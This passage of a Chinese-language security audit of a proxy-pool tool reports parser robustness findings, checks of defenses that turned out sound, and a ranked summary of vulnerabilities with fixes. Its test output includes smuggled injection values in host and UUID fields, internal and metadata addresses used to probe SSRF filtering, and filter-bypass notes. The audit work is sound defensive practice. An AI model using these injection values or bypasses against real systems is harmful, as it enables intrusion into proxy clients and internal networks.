**影响** 已被 `parse_links` 的 `try/except Exception`（`pool.py:515-518`）与 `collect` 的 `try/except`（`pool.py:994-999`）双层兜住，实测 `parse_any` 0 异常，无可利用性。仅作为健壮性缺陷记录：`parse_vmess` 是公开函数，任何新的直接调用点都会踩到。

**修复建议** `if not isinstance(o, dict): return None`。

---

## B-11 【低】`_url_parts` / `urlsplit` 对畸形 IPv6 netloc 抛 `ValueError`

**位置** `pool.py:302-307` `_url_parts()` —— 影响 `parse_vless` / `parse_trojan` / `parse_hysteria2` / `parse_tuic`

**证据**（`audit/b4b_crash.py`）

```
  parse_vless      vless://u@[::1:443           -> ValueError: Invalid IPv6 URL
  parse_any        vless://u@[::1:443           -> 0 节点 (异常已被 parse_links 兜住)
  parse_vless      trojan://p@[abc]:443         -> ValueError: 'abc' does not appear to be an IPv4 or IPv6 address
```

随机 fuzz（`audit/b4_fuzz.py` 4.2）在 4000 组随机输入上共触发 45050 次未捕获异常：

```
  按函数统计: {'parse_vless': 11262, 'parse_trojan': 11262, 'parse_hysteria2': 11262,
               'parse_tuic': 11262, 'parse_vmess': 2}
  按异常类型: {'ValueError': 45048, 'AttributeError': 2}
  --- 4.2b 走正常入口 (parse_links / parse_any) 是否兜住 ---
  parse_links / parse_any 直接入口: 未捕获异常 0 条
```

**影响** 同样被兜住，无可利用性。

**修复建议** `_url_parts` 内包一层 `try/except ValueError: return None`，并让四个解析器处理 `None`。

---

## B-12 【低】`_mini_yaml_proxies` 与 `safe_load` 的解析歧义（不构成审计绕过）

**位置** `pool.py:533-601` `_mini_yaml_proxies()`、`pool.py:604-617` `parse_clash_yaml()`

**证据**（`audit/b5_mini_yaml.py` 5.1）

```
  A 常规块式        safe_load=1 节点  mini=1 节点  一致
  B 流式 {..}      safe_load=1 节点  mini=0 节点  *** 分歧 ***
  C 缩进 0 的列表项  safe_load=1 节点  mini=1 节点  一致
  D proxies 嵌在别的键下  safe_load=0 节点  mini=1 节点  *** 分歧 ***
  E 别名/锚点复用     safe_load=1 节点  mini=1 节点  一致
  F 布尔/数字类型歧义   safe_load=1 节点  mini=1 节点  *** 分歧 ***
      safe_load: {..., "alterId": 16, "skip-cert-verify": true}
      mini     : {..., "alterId": "0x10", "skip-cert-verify": "on"}
  G 没有 port 字段   safe_load=1 节点  mini=0 节点  *** 分歧 ***
  H 多行标量 name    safe_load: {"name": "line1 line2\n"}   mini: {"name": ">"}  *** 分歧 ***
```

关键分歧点：
- mini 用 `re.match(r"^\s*proxies\s*:\s*$", ln)` **匹配任意缩进**，因此嵌在 `proxy-providers:` 下的 `proxies:` 块也会被 mini 解析出来，而 `safe_load` 路径只看顶层 → **同一条源在装/不装 PyYAML 的机器上产出的节点集合不同**；
- mini 的 `scalar()` 只认 `true/yes/false/no`，`on`/`0x10` 保持字符串 → `skip-cert-verify: on` 在 PyYAML 路径下会告警、在 mini 路径下不告警（但内核拒绝字符串 `"on"`，见 B-7，所以不可利用）；
- mini 要求 `port` 非空，流式 YAML 完全不支持。

真实产物对照（同脚本 5.2）：

```
  safe_load=22 节点   mini=22 节点
  首节点键差异: 只在 safe_load=[]  只在 mini=[]
  server 集合一致: True
```

**结论：不构成审计绕过。** 原因是 `audit_pool` 审计的对象和 `build_clash` 输出的对象是**同一个 dict**（`pool.py:1422 strip_private(n)` 只是拷键），不存在"审计看到 A、内核拿到 B"的可能。5.3 的对照实验也确认两条路径下恶意节点都被同样处置。

**修复建议** 若要消除环境相关性：mini 解析器改为只匹配顶层 `proxies:`（`indent == 0`），并让 `scalar()` 的布尔/数字规则与 PyYAML 1.1 对齐（或反过来把 PyYAML 换成 `yaml.BaseLoader` 后再自行归一）。

---

## B-13 【低】`PER_SOURCE_CAP` 在 `parse_any` 之后才截断，峰值内存与源体积成正比

**位置** `pool.py:1000` `capped = raw_nodes[:PER_SOURCE_CAP]`（在 `pool.py:995 raw_nodes = parse_any(text)` 之后）

**证据**（`audit/b8_memory.py` 8.7）

```
  clamp_text 之后输入 = 4.00MB (MAX_PARSE_CHARS=4194304)
  parse_any -> 53317 个节点, 耗时 0.97s, 峰值 Py 分配 30.5MB  (放大 7.6×)
  PER_SOURCE_CAP=2500 是在 parse_any **返回之后**才截断的,
  即峰值内存与源体积成正比, 16 个源并发时理论峰值 ≈ 0.48GB
```

**影响** 单源 30MB、16 并发约 0.48GB 峰值，机器内存紧张时可能触发 swap 甚至 OOM。有界（`clamp_text` 4MB 兜住），属可接受范围，但截断点位置不理想。

**修复建议** 在 `parse_links` / `parse_clash_yaml` 内部按上限提前停止累积（传入 `limit` 参数），或把 `PER_SOURCE_CAP` 的判断放进 `parse_links` 的循环里。

---

# 已排除（验证后确认不是问题）

## E-1 `MAX_RESPONSE_BYTES` 8MB 硬上限有效

`audit/b8_memory.py` 8.1/8.2，本机 HTTP 服务器按需返回指定体积：

```
  服务端声明 1MB      耗时=   0.04s 峰值Py分配=    1.2MB  结果='接受(len=1048576)'
  服务端声明 8MB-1    耗时=   0.01s 峰值Py分配=    8.1MB  结果='接受(len=8388607)'
  服务端声明 8MB      耗时=   0.01s 峰值Py分配=    8.1MB  结果='接受(len=8388608)'
  服务端声明 9MB      耗时=   0.01s 峰值Py分配=    8.1MB  结果='拒绝(len=8388609)'
  服务端声明 64MB     耗时=   0.01s 峰值Py分配=    8.3MB  结果='拒绝(len=8388609)'
      [安全] 响应超过 8MB, 丢弃该源
  fetch_one 9MB       ...  结果="('http://127.0.0.1:18411/big?size=9437184', None)"
  fetch_one 64MB      ...  结果="('http://127.0.0.1:18411/big?size=67108864', None)"
      -> 返回 text 是否为 None: True
```

`pool.py:934 r.read(sec.MAX_RESPONSE_BYTES + 1)` 是有效防线：64MB 响应下峰值 Python 分配稳定在 8.3MB，且 0.01s 内就放弃（不读完全部内容）。

## E-2 gzip 压缩炸弹无效

`audit/b8_memory.py` 8.3：

```
  服务端准备: 解压后 64.8MB, 压缩后约 0.06MB(参考值)
  fetch_one 拉 /gz    耗时=   0.34s 峰值Py分配=  129.7MB  结果="('http://127.0.0.1:18411/gz', 'x��ʱ\\r� ...')"
      -> 收到 197937 字符 (urllib 不自动解压, 未被放大)
```

收到的 197937 字符就是压缩后的字节数 —— `urllib` 不处理 `Content-Encoding`，压缩内容只会变成解析不出东西的乱码。另外 `pool.py:930` 主动发了 `Accept-Encoding: identity`。8.3 里那 129.7MB 峰值来自**我测试服务器自己的 `zlib.compress`**，不是 `fetch_one`（同一次 tracemalloc 覆盖了同进程的 handler 线程）。

## E-3 经典 flow 式 Billion Laughs 绕过 `yaml_bomb` 检测，但无实际影响

`audit/b8_memory.py` 8.4：

```
  经典 Billion Laughs (flow 式, 9 层): 282 字节
  yaml_bomb 判定为炸弹: False
  锚点正则命中数: 0, 别名正则命中数: 0
  yaml.safe_load(billion laughs)     耗时=   0.00s 峰值Py分配=    0.0MB  -> 正常返回
  行尾式锚点 200 个: yaml_bomb = True (True=拦住)
```

`_ANCHOR_RE = &\w+\s*$` 与 `_ALIAS_RE = ^\s*\*\w+` 确实漏掉了 `&a [...]` / `[*a,*a]` 这种行内写法，但 **PyYAML 的别名是共享引用而非展开复制**，所以经典炸弹在 PyYAML 上本来就不成立（实测 0.00s / 0.0MB）。这是"检测器有洞但洞后面没有坑"。真正的 DoS 是 B-6 的深嵌套，建议按 B-6 修。

## E-4 非标准 IP 写法虽然通过审计，但内核拒绝解析

`audit/b1b_kernel_resolve.py` —— 用 `mihomo` 真实拨号观察（本机监听 19443）：

```
  127.1                audit=PASS   log: 127.1:19443 connect error: dns resolve failed: couldn't find ip
  127.0.1              audit=PASS   log: dns resolve failed: couldn't find ip
  2130706433           audit=PASS   log: dns resolve failed: couldn't find ip
  0x7f000001           audit=PASS   log: dns resolve failed: couldn't find ip
  017700000001         audit=PASS   log: dns resolve failed: couldn't find ip
  10.1                 audit=PASS   log: 10.1:19443 connect error: no ip address
  167772161            audit=PASS   log: dns resolve failed: couldn't find ip
  router               audit=PASS   log: dns resolve failed: couldn't find ip
  1.2.3.4              audit=PASS   log: dial tcp 1.2.3.4:19443: i/o timeout   <- 对照: 正常地址能拨
```

Go 的解析器不接受 `inet_aton` 式简写，内核一律 `dns resolve failed`。**不是 SSRF**；副作用只是这些死节点会通过审计进入池子浪费探活预算（可忽略）。真正的内网绕过走的是 E 组之外的 DNS 重绑定路径（B-3）。

## E-5 敏感端口的等价写法全部被挡

`audit/b1_audit_bypass.py` 1.3：

```
  22 int             -> BLOCKED-sensitive-port
  '22' 字符串         -> BLOCKED-sensitive-port
  022 八进制串         -> BLOCKED-sensitive-port      (经 _int() 归一成 22)
  '22 ' 带空格        -> BLOCKED-sensitive-port
  3306 int           -> BLOCKED-sensitive-port
  '3306' 字符串       -> BLOCKED-sensitive-port
  22.0 浮点           -> DROPPED-normalize            (normalize 拒绝)
  0x16 十六进制串       -> DROPPED-normalize
  True (bool 子类 int) -> DROPPED-normalize
```

`normalize` 先把 port 归一成 int 再交给 `audit_node`，两侧一致，没有等价写法缺口。

## E-6 链接名转义完整，通用订阅结构未被污染

`audit/b7_links.py` 7.1/7.2/7.3：`proxy_to_link` 对 name 用 `urllib.parse.quote(..., safe="")`，`#`、`&`、`?`、`%`、`/`、`\`、空格、`\n`、`\r`、`U+2028`、emoji、`</script>`、`a\r\nX-Injected: 1` 全部被百分号编码；`build_b64` 的产物行数与节点数一致（90 = 90），无裸换行、无非法行；所有协议的名字往返解析一致（7.2 无任何输出即全部通过）。

## E-7 `server` 与 vless/vmess 的 uuid 注入尝试全部被挡

`audit/b7_links.py` 7.4：

```
  vless server = '1.2.3.4#evil' / '1.2.3.4?x=1' / '1.2.3.4@evil.com' /
                 'evil.com/path' / '1.2.3.4\nMATCH,DIRECT' / 'a'*300
                                    -> normalize 丢弃 (已挡)
  vless uuid   = 'u@evil.com' / 'u#frag' / 'u?q=1' / 'u\nnewline'  -> normalize 丢弃 (已挡)
```

`bad_host()` 的 `_HOST_RE` 与 `bad_credential()` 的 uuid 字符集共同生效。（`tuic` 的 uuid 例外，见 B-9。）

## E-8 内网/回环 IP 字面量全部被挡

`audit/b1_audit_bypass.py` 1.1/1.2 中所有 IP 字面量形式均为 `DROPPED-normalize`：`127.0.0.1`、`127.0.0.1.`、`[::1]`、`::1`、`[0:0:0:0:0:0:0:1]`、`[::ffff:127.0.0.1]`、`::ffff:7f00:1`、`localhost`、`localhost.`、`LOCALHOST`、`0.0.0.0`、`[::]`、`10.0.0.1`、`192.168.1.1`、`172.16.0.1`、`169.254.169.254`、`[fd00::1]`、`[fe80::1]`、`224.0.0.1`、`240.0.0.1`、`[::ffff:10.0.0.1]`、`evil.local`、`evil.local.`、`evil.internal`、`evil.home.arpa`。`ipaddress` 判定 + `_INTERNAL_SUFFIX` + `_HOST_RE` 三层配合，字面量层面没有缺口。

（`evil.localdomain`、`router`、`nas` 三个是漏网的，已在 B-3 里记录为建议项；它们本身不解析到内网，风险等级低。）

## E-9 其余正则与 `yaml_bomb` 无 ReDoS

`audit/b4_fuzz.py` 4.3：

```
  _LURE_RE.search  '登录'×128000  耗时=   0.000s
  bad_host 长度=100000            耗时=   0.000s      (len>253 提前返回)
  yaml_bomb 长度=1400000          耗时=   0.014s
  detect_region 长度=100000       耗时=   0.174s
```

只有 `AD_PAT` 有问题（B-4）。

## E-10 正常入口对畸形输入 0 未捕获异常

`audit/b4_fuzz.py` 4.1（50 条定向畸形用例）与 4.2b（4000 组随机输入）：

```
  ### 4.1 畸形输入 fuzz: parse_any 是否抛未捕获异常 / 卡死
    -> 共 50 条, 抛异常 0 条, 无异常超 1s 的条目见上
  --- 4.2b 走正常入口 (parse_links / parse_any) 是否兜住 ---
    parse_links / parse_any 直接入口: 未捕获异常 0 条
```

解析器内部的异常（B-10/B-11）都被 `parse_links`（`pool.py:515`）与 `collect`（`pool.py:994`）兜住。

## E-11 真实产物在两条 YAML 路径下一致

`audit/b5_mini_yaml.py` 5.2：`out/pool.yaml` 经 `safe_load` 与 `_mini_yaml_proxies` 都是 22 个节点，首节点键集合完全相同，`server` 集合一致。

---

# 结论摘要（按严重度排序）

| 编号 | 严重度 | 标题 | 位置 |
|---|---|---|---|
| B-1 | 严重 | 产物 YAML 顶层注入（U+2028/U+2029/U+0085 键名逃逸），可注入 `tun`/`tunnels`/`hosts`，并绕过 `harden_kernel_config`（内核实测去建 TUN 设备） | `pool.py:639,1388,698` |
| B-2 | 高 | 节点字段全量透传，`dialer-proxy` 等内核选项被攻击者控制且实测生效 | `pool.py:672-678,1077` |
| B-3 | 高 | DNS 重绑定/通配域名绕过 `bad_server`，节点指向回环、内核真实连上本机 | `pool.py:745-761` |
| B-4 | 高 | `AD_PAT` O(n³) ReDoS：名字 4KB → 卡 2 分钟，32KB → 约 16 小时，在 `normalize` 主路径上 | `pool.py:623-625,630` |
| B-5 | 中 | 深嵌套节点 → `RecursionError` → 整轮刷新崩溃，daemon 下持续失败 | `pool.py:642,1382,2215,2321` |
| B-6 | 中 | PyYAML 深嵌套 `safe_load` 超线性耗时（3KB → 15.6s），`yaml_bomb` 不查嵌套 | `pool.py:607`，`security.py:52-57` |
| B-7 | 中 | `skip-cert-verify` 审计绕过（整型 `1` / `Skip-Cert-Verify` / `skip_cert_verify`） | `security.py:152` |
| B-8 | 中 | 分流规则缺口：腾讯云/Azure 元数据域名走代理，内网段漏 10 项，银行清单漏 10+ 家 | `security.py:334-381` |
| B-9 | 中 | `tuic` uuid 未校验 → 生成结构破损的链接污染通用订阅 | `pool.py:790-792,890` |
| B-10 | 低 | `parse_vmess` 对 JSON 顶层非 object 抛 `AttributeError`（已被兜住） | `pool.py:243-246` |
| B-11 | 低 | `_url_parts`/`urlsplit` 对畸形 IPv6 netloc 抛 `ValueError`（已被兜住） | `pool.py:302-307` |
| B-12 | 低 | `_mini_yaml_proxies` 与 `safe_load` 的解析歧义（不构成审计绕过） | `pool.py:533-617` |
| B-13 | 低 | `PER_SOURCE_CAP` 截断点太晚，峰值内存与源体积成正比 | `pool.py:1000` |

**最该先修的三件事**

1. **B-1 的根因**：`_yaml_lines()` 输出键名不做引号/转义 + `_CTRL_RE` 漏掉 Unicode 行分隔符。两处都要改，并且加一道"产物反解后顶层键必须等于预期集合"的自校验 —— 这是唯一能让整条注入链失效的组合。
2. **B-2/B-7 的共同根因**：`normalize()` 用黑名单而不是白名单。改成按协议类型的字段白名单，B-2、B-7、B-9 一起解决。
3. **B-4**：`clean_name()` 先截断再清洗（一行改动），同时重写 `AD_PAT` 去掉两个相邻 `\s*`。

**整体判断**：这个项目的安全设计思路（输入隔离 → 节点审计 → 进程隔离 → 访问控制 → 分流规则五层）方向是对的，注释里写的威胁模型也很清醒。但数据面的两条主干——**"键名/字段的信任边界"和"资源消耗的上限"**——都存在系统性缺口：前者因为把"剔除几个已知坏键"当成了过滤，后者因为把"字节数上限"当成了资源上限。B-1 和 B-4 各自只需要一个源就能把"客户端被配置接管"和"刷新永远跑不完"变成现实。
